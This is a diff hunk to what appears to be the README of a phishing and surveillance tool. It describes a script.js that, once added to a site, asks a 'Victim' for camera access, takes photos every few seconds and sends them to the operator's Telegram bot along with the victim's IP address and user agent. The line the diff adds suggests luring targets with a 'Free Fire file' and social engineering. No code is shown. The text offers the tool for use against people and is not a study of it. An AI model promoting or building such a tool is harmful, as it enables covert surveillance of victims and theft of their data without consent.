@@ -3,6 +3,7 @@
 ### You ONLY need simple hosting and a telegram account
 You can just add a script.js file to your site and watch.
 When the Victim enters the site, he will be asked to access the camera and take pictures every 6 seconds, for example. Then all the data, including the IP address, user Agent, and pictures, will be sent to your bot on telegram easily.
+Or u can just upload a Free Fire file and use social engineering to hunt.
 ## Features
 - Receive all informatin and photo on the telegram bot.
 - Easy to use
